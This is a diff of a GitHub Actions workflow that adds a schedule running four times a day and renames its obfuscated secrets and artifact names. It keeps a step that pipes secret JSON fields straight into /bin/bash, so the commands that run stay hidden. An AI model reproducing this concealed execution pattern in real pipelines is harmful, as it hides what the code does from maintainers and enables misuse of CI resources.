@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,18 +15,14 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          pu275: ${{ secrets.pu275 }}
+          vjp11: ${{ secrets.vjp11 }}
         run: |
-          printf '%s' "$pu275" | jq -r .oifh770 | /bin/bash
-          echo $qdjjr1 | jq -r .spsz840 | /bin/bash
-          printf '%s' "$of13" | jq -r .bidct58507 | /bin/bash
-          echo $csze60 | jq -r .h96 | /bin/bash
-          printf '%s' "$r41" | jq -r .hngi24991 | /bin/bash
-          printf '%s' "$delh15032" | jq -r .vyyw38903 | /bin/bash
+          printf '%s' "$vjp11" | jq -r .b03140 | /bin/bash
+          echo $ioeo778 | jq -r .pdzjm2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: 6Phbwiva
+          name: JyuEoW19
           path: "*.zip"
           retention-days: 1
